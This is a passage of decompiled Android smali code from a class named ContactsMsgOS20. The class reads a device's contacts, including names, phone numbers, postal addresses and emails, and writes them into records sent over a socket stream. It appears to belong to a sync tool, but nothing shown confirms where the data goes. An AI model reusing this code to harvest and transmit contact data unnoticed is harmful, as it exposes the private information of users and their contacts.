.class public Lcom/Android/MFSocket/ContactsMsgOS20;
.super Ljava/lang/Object;
.source "ContactsMsgOS20.java"


# annotations
.annotation system Ldalvik/annotation/MemberClasses;
    value = {
        Lcom/Android/MFSocket/ContactsMsgOS20$AddressHolder;,
        Lcom/Android/MFSocket/ContactsMsgOS20$EmailHolder;,
        Lcom/Android/MFSocket/ContactsMsgOS20$PhoneHolder;
    }
.end annotation


# instance fields
.field private mAddrMap:Ljava/util/HashMap;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Ljava/util/HashMap",
            "<",
            "Ljava/lang/String;",
            "Lcom/Android/MFSocket/ContactsMsgOS20$AddressHolder;",
            ">;"
        }
    .end annotation
.end field

.field private mMailMap:Ljava/util/HashMap;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Ljava/util/HashMap",
            "<",
            "Ljava/lang/String;",
            "Lcom/Android/MFSocket/ContactsMsgOS20$EmailHolder;",
            ">;"
        }
    .end annotation
.end field

.field private mPhoneMap:Ljava/util/HashMap;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Ljava/util/HashMap",
            "<",
            "Ljava/lang/String;",
            "Lcom/Android/MFSocket/ContactsMsgOS20$PhoneHolder;",
            ">;"
        }
    .end annotation
.end field

.field public mResolver:Landroid/content/ContentResolver;


# direct methods
.method constructor <init>(Landroid/content/ContentResolver;)V
    .locals 1
    .param p1, "contentResolver"    # Landroid/content/ContentResolver;

    .prologue
    .line 41
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    .line 37
    new-instance v0, Ljava/util/HashMap;

    invoke-direct {v0}, Ljava/util/HashMap;-><init>()V

    iput-object v0, p0, Lcom/Android/MFSocket/ContactsMsgOS20;->mMailMap:Ljava/util/HashMap;

    .line 38
    new-instance v0, Ljava/util/HashMap;

    invoke-direct {v0}, Ljava/util/HashMap;-><init>()V

    iput-object v0, p0, Lcom/Android/MFSocket/ContactsMsgOS20;->mPhoneMap:Ljava/util/HashMap;

    .line 39
    new-instance v0, Ljava/util/HashMap;

    invoke-direct {v0}, Ljava/util/HashMap;-><init>()V

    iput-object v0, p0, Lcom/Android/MFSocket/ContactsMsgOS20;->mAddrMap:Ljava/util/HashMap;

    .line 42
    iput-object p1, p0, Lcom/Android/MFSocket/ContactsMsgOS20;->mResolver:Landroid/content/ContentResolver;

    .line 43
    return-void
.end method


# virtual methods
.method appendStr(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
    .locals 2
    .param p1, "str"    # Ljava/lang/String;
    .param p2, "append"    # Ljava/lang/String;

    .prologue
    .line 85
    if-eqz p1, :cond_0

    .line 87
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-static {p1}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v1

    invoke-direct {v0, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v1, ";"

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    .line 88
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-static {p1}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v1

    invoke-direct {v0, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0, p2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    .line 93
    :goto_0
    return-object p1

    .line 90
    :cond_0
    move-object p1, p2

    goto :goto_0
.end method

.method getAddressMap()V
    .locals 20

    .prologue
    .line 146
    const/16 v1, 0x9

    new-array v3, v1, [Ljava/lang/String;

    const/4 v1, 0x0

    const-string v2, "contact_id"

    aput-object v2, v3, v1

    const/4 v1, 0x1

    const-string v2, "data2"

    aput-object v2, v3, v1

    const/4 v1, 0x2

    const-string v2, "data4"

    aput-object v2, v3, v1

    const/4 v1, 0x3

    const-string v2, "data7"

    aput-object v2, v3, v1

    const/4 v1, 0x4

    const-string v2, "data5"

    aput-object v2, v3, v1

    const/4 v1, 0x5

    .line 147
    const-string v2, "data6"

    aput-object v2, v3, v1

    const/4 v1, 0x6

    const-string v2, "data8"

    aput-object v2, v3, v1

    const/4 v1, 0x7

    const-string v2, "data9"

    aput-object v2, v3, v1

    const/16 v1, 0x8

    const-string v2, "data10"

    aput-object v2, v3, v1

    .line 148
    .local v3, "projection":[Ljava/lang/String;
    move-object/from16 v0, p0

    iget-object v1, v0, Lcom/Android/MFSocket/ContactsMsgOS20;->mResolver:Landroid/content/ContentResolver;

    sget-object v2, Landroid/provider/ContactsContract$CommonDataKinds$StructuredPostal;->CONTENT_URI:Landroid/net/Uri;

    const/4 v4, 0x0

    const/4 v5, 0x0

    const/4 v6, 0x0

    invoke-virtual/range {v1 .. v6}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v8

    .line 149
    .local v8, "address":Landroid/database/Cursor;
    if-nez v8, :cond_0

    .line 198
    :goto_0
    return-void

    .line 153
    :cond_0
    invoke-interface {v8}, Landroid/database/Cursor;->moveToFirst()Z

    move-result v1

    if-eqz v1, :cond_4

    .line 156
    :cond_1
    const/4 v7, 0x0

    .line 158
    .local v7, "addrType":I
    const/4 v1, 0x1

    :try_start_0
    invoke-interface {v8, v1}, Landroid/database/Cursor;->getInt(I)I

    move-result v7

    .line 159
    const/4 v1, 0x2

    invoke-interface {v8, v1}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v19

    .line 160
    .local v19, "street":Ljava/lang/String;
    const/4 v1, 0x3

    invoke-interface {v8, v1}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v9

    .line 161
    .local v9, "city":Ljava/lang/String;
    const/4 v1, 0x4

    invoke-interface {v8, v1}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v15

    .line 162
    .local v15, "pobox":Ljava/lang/String;
    const/4 v1, 0x5

    invoke-interface {v8, v1}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v14

    .line 163
    .local v14, "neighborhood":Ljava/lang/String;
    const/4 v1, 0x6

    invoke-interface {v8, v1}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v18

    .line 164
    .local v18, "region":Ljava/lang/String;
    const/4 v1, 0x7

    invoke-interface {v8, v1}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v17

    .line 165
    .local v17, "postcode":Ljava/lang/String;
    const/16 v1, 0x8

    invoke-interface {v8, v1}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v10

    .line 166
    .local v10, "country":Ljava/lang/String;
    new-instance v2, Ljava/lang/StringBuilder;

    if-nez v10, :cond_5

    const-string v1, ""

    :goto_1
    invoke-static {v1}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v1

    invoke-direct {v2, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    if-nez v18, :cond_6

    const-string v1, ""

    :goto_2
    invoke-virtual {v2, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    if-nez v9, :cond_7

    const-string v1, ""

    :goto_3
    invoke-virtual {v2, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    if-nez v19, :cond_8

    const-string v1, ""

    :goto_4
    invoke-virtual {v2, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    .line 167
    if-nez v14, :cond_9

    const-string v1, ""

    :goto_5
    invoke-virtual {v2, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    if-nez v15, :cond_a

    const-string v1, ""

    :goto_6
    invoke-virtual {v2, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    if-nez v17, :cond_b

    const-string v1, ""

    :goto_7
    invoke-virtual {v2, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    .line 166
    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    move-result-object v16

    .line 172
    .end local v9    # "city":Ljava/lang/String;
    .end local v10    # "country":Ljava/lang/String;
    .end local v14    # "neighborhood":Ljava/lang/String;
    .end local v15    # "pobox":Ljava/lang/String;
    .end local v17    # "postcode":Ljava/lang/String;
    .end local v18    # "region":Ljava/lang/String;
    .end local v19    # "street":Ljava/lang/String;
    .local v16, "postaladdr":Ljava/lang/String;
    :goto_8
    const/4 v1, 0x0

    invoke-interface {v8, v1}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v13

    .line 173
    .local v13, "id":Ljava/lang/String;
    move-object/from16 v0, p0

    iget-object v1, v0, Lcom/Android/MFSocket/ContactsMsgOS20;->mAddrMap:Ljava/util/HashMap;

    invoke-virtual {v1, v13}, Ljava/util/HashMap;->get(Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v12

    check-cast v12, Lcom/Android/MFSocket/ContactsMsgOS20$AddressHolder;

    .line 174
    .local v12, "holder":Lcom/Android/MFSocket/ContactsMsgOS20$AddressHolder;
    if-nez v12, :cond_2

    .line 175
    new-instance v12, Lcom/Android/MFSocket/ContactsMsgOS20$AddressHolder;

    .end local v12    # "holder":Lcom/Android/MFSocket/ContactsMsgOS20$AddressHolder;
    move-object/from16 v0, p0

    invoke-direct {v12, v0}, Lcom/Android/MFSocket/ContactsMsgOS20$AddressHolder;-><init>(Lcom/Android/MFSocket/ContactsMsgOS20;)V

    .line 176
    .restart local v12    # "holder":Lcom/Android/MFSocket/ContactsMsgOS20$AddressHolder;
    move-object/from16 v0, p0

    iget-object v1, v0, Lcom/Android/MFSocket/ContactsMsgOS20;->mAddrMap:Ljava/util/HashMap;

    invoke-virtual {v1, v13, v12}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    .line 179
    :cond_2
    const/4 v1, 0x1

    if-ne v1, v7, :cond_d

    .line 180
    iget-object v1, v12, Lcom/Android/MFSocket/ContactsMsgOS20$AddressHolder;->postalhome:Ljava/lang/String;

    if-nez v1, :cond_c

    .line 181
    move-object/from16 v0, v16

    iput-object v0, v12, Lcom/Android/MFSocket/ContactsMsgOS20$AddressHolder;->postalhome:Ljava/lang/String;

    .line 194
    :cond_3
    :goto_9
    invoke-interface {v8}, Landroid/database/Cursor;->moveToNext()Z

    move-result v1

    if-nez v1, :cond_1

    .line 197
    .end local v7    # "addrType":I
    .end local v12    # "holder":Lcom/Android/MFSocket/ContactsMsgOS20$AddressHolder;
    .end local v13    # "id":Ljava/lang/String;
    .end local v16    # "postaladdr":Ljava/lang/String;
    :cond_4
    invoke-interface {v8}, Landroid/database/Cursor;->close()V

    goto/16 :goto_0

    .line 166
    .restart local v7    # "addrType":I
    .restart local v9    # "city":Ljava/lang/String;
    .restart local v10    # "country":Ljava/lang/String;
    .restart local v14    # "neighborhood":Ljava/lang/String;
    .restart local v15    # "pobox":Ljava/lang/String;
    .restart local v17    # "postcode":Ljava/lang/String;
    .restart local v18    # "region":Ljava/lang/String;
    .restart local v19    # "street":Ljava/lang/String;
    :cond_5
    :try_start_1
    new-instance v1, Ljava/lang/StringBuilder;

    invoke-static {v10}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v4

    invoke-direct {v1, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v4, ","

    invoke-virtual {v1, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    goto/16 :goto_1

    :cond_6
    new-instance v1, Ljava/lang/StringBuilder;

    invoke-static/range {v18 .. v18}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v4

    invoke-direct {v1, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v4, ","

    invoke-virtual {v1, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    goto/16 :goto_2

    :cond_7
    new-instance v1, Ljava/lang/StringBuilder;

    invoke-static {v9}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v4

    invoke-direct {v1, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v4, ","

    invoke-virtual {v1, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    goto/16 :goto_3

    :cond_8
    new-instance v1, Ljava/lang/StringBuilder;

    invoke-static/range {v19 .. v19}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v4

    invoke-direct {v1, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v4, ","

    invoke-virtual {v1, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    goto/16 :goto_4

    .line 167
    :cond_9
    new-instance v1, Ljava/lang/StringBuilder;

    invoke-static {v14}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v4

    invoke-direct {v1, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v4, ","

    invoke-virtual {v1, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    goto/16 :goto_5

    :cond_a
    new-instance v1, Ljava/lang/StringBuilder;

    invoke-static {v15}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v4

    invoke-direct {v1, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v4, ","

    invoke-virtual {v1, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    goto/16 :goto_6

    :cond_b
    new-instance v1, Ljava/lang/StringBuilder;

    invoke-static/range {v17 .. v17}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v4

    invoke-direct {v1, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v4, "."

    invoke-virtual {v1, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    move-result-object v1

    goto/16 :goto_7

    .line 168
    .end local v9    # "city":Ljava/lang/String;
    .end local v10    # "country":Ljava/lang/String;
    .end local v14    # "neighborhood":Ljava/lang/String;
    .end local v15    # "pobox":Ljava/lang/String;
    .end local v17    # "postcode":Ljava/lang/String;
    .end local v18    # "region":Ljava/lang/String;
    .end local v19    # "street":Ljava/lang/String;
    :catch_0
    move-exception v11

    .line 169
    .local v11, "e":Ljava/lang/Exception;
    invoke-virtual {v11}, Ljava/lang/Exception;->printStackTrace()V

    .line 170
    const-string v16, ""

    .restart local v16    # "postaladdr":Ljava/lang/String;
    goto/16 :goto_8

    .line 183
    .end local v11    # "e":Ljava/lang/Exception;
    .restart local v12    # "holder":Lcom/Android/MFSocket/ContactsMsgOS20$AddressHolder;
    .restart local v13    # "id":Ljava/lang/String;
    :cond_c
    iget-object v1, v12, Lcom/Android/MFSocket/ContactsMsgOS20$AddressHolder;->postalhome:Ljava/lang/String;

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-static {v1}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v1

    invoke-direct {v2, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v1, ";"

    invoke-virtual {v2, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    iput-object v1, v12, Lcom/Android/MFSocket/ContactsMsgOS20$AddressHolder;->postalhome:Ljava/lang/String;

    .line 184
    iget-object v1, v12, Lcom/Android/MFSocket/ContactsMsgOS20$AddressHolder;->postalhome:Ljava/lang/String;

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-static {v1}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v1

    invoke-direct {v2, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    move-object/from16 v0, v16

    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    iput-object v1, v12, Lcom/Android/MFSocket/ContactsMsgOS20$AddressHolder;->postalhome:Ljava/lang/String;

    goto/16 :goto_9

    .line 186
    :cond_d
    const/4 v1, 0x2

    if-ne v1, v7, :cond_3

    .line 187
    iget-object v1, v12, Lcom/Android/MFSocket/ContactsMsgOS20$AddressHolder;->postalwork:Ljava/lang/String;

    if-nez v1, :cond_e

    .line 188
    move-object/from16 v0, v16

    iput-object v0, v12, Lcom/Android/MFSocket/ContactsMsgOS20$AddressHolder;->postalwork:Ljava/lang/String;

    goto/16 :goto_9

    .line 190
    :cond_e
    iget-object v1, v12, Lcom/Android/MFSocket/ContactsMsgOS20$AddressHolder;->postalwork:Ljava/lang/String;

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-static {v1}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v1

    invoke-direct {v2, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v1, ";"

    invoke-virtual {v2, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    iput-object v1, v12, Lcom/Android/MFSocket/ContactsMsgOS20$AddressHolder;->postalwork:Ljava/lang/String;

    .line 191
    iget-object v1, v12, Lcom/Android/MFSocket/ContactsMsgOS20$AddressHolder;->postalwork:Ljava/lang/String;

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-static {v1}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v1

    invoke-direct {v2, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    move-object/from16 v0, v16

    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    iput-object v1, v12, Lcom/Android/MFSocket/ContactsMsgOS20$AddressHolder;->postalwork:Ljava/lang/String;

    goto/16 :goto_9
.end method

.method getContactOS20(Ljava/io/BufferedOutputStream;Ljava/lang/StringBuffer;I)V
    .locals 20
    .param p1, "out"    # Ljava/io/BufferedOutputStream;
    .param p2, "contatMsg"    # Ljava/lang/StringBuffer;
    .param p3, "oneTimeCount"    # I

    .prologue
    .line 202
    invoke-virtual/range {p0 .. p0}, Lcom/Android/MFSocket/ContactsMsgOS20;->getAddressMap()V

    .line 203
    invoke-virtual/range {p0 .. p0}, Lcom/Android/MFSocket/ContactsMsgOS20;->getPhoneMap()V

    .line 204
    invoke-virtual/range {p0 .. p0}, Lcom/Android/MFSocket/ContactsMsgOS20;->getEmailMap()V

    .line 205
    move-object/from16 v0, p0

    iget-object v2, v0, Lcom/Android/MFSocket/ContactsMsgOS20;->mResolver:Landroid/content/ContentResolver;

    if-nez v2, :cond_1

    .line 282
    :cond_0
    :goto_0
    return-void

    .line 208
    :cond_1
    move-object/from16 v0, p0

    iget-object v2, v0, Lcom/Android/MFSocket/ContactsMsgOS20;->mResolver:Landroid/content/ContentResolver;

    sget-object v3, Landroid/provider/ContactsContract$Contacts;->CONTENT_URI:Landroid/net/Uri;

    const/4 v4, 0x0

    const/4 v5, 0x0

    const/4 v6, 0x0

    const-string v7, "display_name COLLATE LOCALIZED ASC"

    invoke-virtual/range {v2 .. v7}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v12

    .line 209
    .local v12, "cur":Landroid/database/Cursor;
    if-eqz v12, :cond_0

    .line 212
    invoke-interface {v12}, Landroid/database/Cursor;->moveToFirst()Z

    move-result v2

    if-eqz v2, :cond_0

    .line 217
    invoke-interface {v12}, Landroid/database/Cursor;->getCount()I

    move-result v9

    .line 218
    .local v9, "contactConts":I
    new-instance v11, Ljava/lang/StringBuffer;

    invoke-direct {v11}, Ljava/lang/StringBuffer;-><init>()V

    .line 219
    .local v11, "count":Ljava/lang/StringBuffer;
    invoke-virtual {v11, v9}, Ljava/lang/StringBuffer;->append(I)Ljava/lang/StringBuffer;

    .line 220
    invoke-virtual {v11}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;

    move-result-object v2

    move-object/from16 v0, p1

    invoke-static {v0, v2}, Lcom/Android/MFSocket/SocketTrans;->sendData(Ljava/io/BufferedOutputStream;Ljava/lang/String;)V

    .line 222
    const/16 v17, 0x0

    .line 224
    .local v17, "name":Ljava/lang/String;
    const-string v2, "_id"

    invoke-interface {v12, v2}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v15

    .line 225
    .local v15, "idColumn":I
    const-string v2, "display_name"

    invoke-interface {v12, v2}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v13

    .line 227
    .local v13, "displayNameColumn":I
    const/16 v16, 0x0

    .line 229
    .local v16, "nSendCount":I
    :cond_2
    const-string v17, ""

    .line 230
    invoke-interface {v12, v15}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v10

    .line 231
    .local v10, "contactId":Ljava/lang/String;
    invoke-interface {v12, v13}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v17

    .line 233
    add-int/lit8 v16, v16, 0x1

    .line 238
    const-string v2, "has_phone_number"

    invoke-interface {v12, v2}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v2

    invoke-interface {v12, v2}, Landroid/database/Cursor;->getInt(I)I

    move-result v18

    .line 239
    .local v18, "phoneCount":I
    if-lez v18, :cond_6

    .line 240
    move-object/from16 v0, p0

    iget-object v2, v0, Lcom/Android/MFSocket/ContactsMsgOS20;->mPhoneMap:Ljava/util/HashMap;

    invoke-virtual {v2, v10}, Ljava/util/HashMap;->get(Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v19

    check-cast v19, Lcom/Android/MFSocket/ContactsMsgOS20$PhoneHolder;

    .line 247
    .local v19, "phoneHolder":Lcom/Android/MFSocket/ContactsMsgOS20$PhoneHolder;
    :goto_1
    move-object/from16 v0, p0

    iget-object v2, v0, Lcom/Android/MFSocket/ContactsMsgOS20;->mAddrMap:Ljava/util/HashMap;

    invoke-virtual {v2, v10}, Ljava/util/HashMap;->get(Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v8

    check-cast v8, Lcom/Android/MFSocket/ContactsMsgOS20$AddressHolder;

    .line 248
    .local v8, "addrHolder":Lcom/Android/MFSocket/ContactsMsgOS20$AddressHolder;
    if-nez v8, :cond_3

    .line 249
    new-instance v8, Lcom/Android/MFSocket/ContactsMsgOS20$AddressHolder;

    .end local v8    # "addrHolder":Lcom/Android/MFSocket/ContactsMsgOS20$AddressHolder;
    move-object/from16 v0, p0

    invoke-direct {v8, v0}, Lcom/Android/MFSocket/ContactsMsgOS20$AddressHolder;-><init>(Lcom/Android/MFSocket/ContactsMsgOS20;)V

    .line 254
    .restart local v8    # "addrHolder":Lcom/Android/MFSocket/ContactsMsgOS20$AddressHolder;
    :cond_3
    move-object/from16 v0, p0

    iget-object v2, v0, Lcom/Android/MFSocket/ContactsMsgOS20;->mMailMap:Ljava/util/HashMap;

    invoke-virtual {v2, v10}, Ljava/util/HashMap;->get(Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v14

    check-cast v14, Lcom/Android/MFSocket/ContactsMsgOS20$EmailHolder;

    .line 255
    .local v14, "emailHolder":Lcom/Android/MFSocket/ContactsMsgOS20$EmailHolder;
    if-nez v14, :cond_4

    .line 256
    new-instance v14, Lcom/Android/MFSocket/ContactsMsgOS20$EmailHolder;

    .end local v14    # "emailHolder":Lcom/Android/MFSocket/ContactsMsgOS20$EmailHolder;
    move-object/from16 v0, p0

    invoke-direct {v14, v0}, Lcom/Android/MFSocket/ContactsMsgOS20$EmailHolder;-><init>(Lcom/Android/MFSocket/ContactsMsgOS20;)V

    .line 259
    .restart local v14    # "emailHolder":Lcom/Android/MFSocket/ContactsMsgOS20$EmailHolder;
    :cond_4
    move-object/from16 v0, v17

    move-object/from16 v1, p2

    invoke-static {v0, v1}, Lcom/Android/MFSocket/RecordPackage;->AppendItem(Ljava/lang/String;Ljava/lang/StringBuffer;)V

    .line 260
    move-object/from16 v0, v19

    iget-object v2, v0, Lcom/Android/MFSocket/ContactsMsgOS20$PhoneHolder;->mobile:Ljava/lang/String;

    move-object/from16 v0, p2

    invoke-static {v2, v0}, Lcom/Android/MFSocket/RecordPackage;->AppendItem(Ljava/lang/String;Ljava/lang/StringBuffer;)V

    .line 261
    move-object/from16 v0, v19

    iget-object v2, v0, Lcom/Android/MFSocket/ContactsMsgOS20$PhoneHolder;->workNo:Ljava/lang/String;

    move-object/from16 v0, p2

    invoke-static {v2, v0}, Lcom/Android/MFSocket/RecordPackage;->AppendItem(Ljava/lang/String;Ljava/lang/StringBuffer;)V

    .line 262
    move-object/from16 v0, v19

    iget-object v2, v0, Lcom/Android/MFSocket/ContactsMsgOS20$PhoneHolder;->homeNo:Ljava/lang/String;

    move-object/from16 v0, p2

    invoke-static {v2, v0}, Lcom/Android/MFSocket/RecordPackage;->AppendItem(Ljava/lang/String;Ljava/lang/StringBuffer;)V

    .line 263
    move-object/from16 v0, v19

    iget-object v2, v0, Lcom/Android/MFSocket/ContactsMsgOS20$PhoneHolder;->pagerNo:Ljava/lang/String;

    move-object/from16 v0, p2

    invoke-static {v2, v0}, Lcom/Android/MFSocket/RecordPackage;->AppendItem(Ljava/lang/String;Ljava/lang/StringBuffer;)V

    .line 264
    move-object/from16 v0, v19

    iget-object v2, v0, Lcom/Android/MFSocket/ContactsMsgOS20$PhoneHolder;->customNo:Ljava/lang/String;

    move-object/from16 v0, p2

    invoke-static {v2, v0}, Lcom/Android/MFSocket/RecordPackage;->AppendItem(Ljava/lang/String;Ljava/lang/StringBuffer;)V

    .line 265
    move-object/from16 v0, v19

    iget-object v2, v0, Lcom/Android/MFSocket/ContactsMsgOS20$PhoneHolder;->otherNo:Ljava/lang/String;

    move-object/from16 v0, p2

    invoke-static {v2, v0}, Lcom/Android/MFSocket/RecordPackage;->AppendItem(Ljava/lang/String;Ljava/lang/StringBuffer;)V

    .line 266
    move-object/from16 v0, v19

    iget-object v2, v0, Lcom/Android/MFSocket/ContactsMsgOS20$PhoneHolder;->faxWork:Ljava/lang/String;

    move-object/from16 v0, p2

    invoke-static {v2, v0}, Lcom/Android/MFSocket/RecordPackage;->AppendItem(Ljava/lang/String;Ljava/lang/StringBuffer;)V

    .line 267
    move-object/from16 v0, v19

    iget-object v2, v0, Lcom/Android/MFSocket/ContactsMsgOS20$PhoneHolder;->faxHome:Ljava/lang/String;

    move-object/from16 v0, p2

    invoke-static {v2, v0}, Lcom/Android/MFSocket/RecordPackage;->AppendItem(Ljava/lang/String;Ljava/lang/StringBuffer;)V

    .line 268
    iget-object v2, v14, Lcom/Android/MFSocket/ContactsMsgOS20$EmailHolder;->workEmail:Ljava/lang/String;

    move-object/from16 v0, p2

    invoke-static {v2, v0}, Lcom/Android/MFSocket/RecordPackage;->AppendItem(Ljava/lang/String;Ljava/lang/StringBuffer;)V

    .line 269
    iget-object v2, v14, Lcom/Android/MFSocket/ContactsMsgOS20$EmailHolder;->homeEmail:Ljava/lang/String;

    move-object/from16 v0, p2

    invoke-static {v2, v0}, Lcom/Android/MFSocket/RecordPackage;->AppendItem(Ljava/lang/String;Ljava/lang/StringBuffer;)V

    .line 270
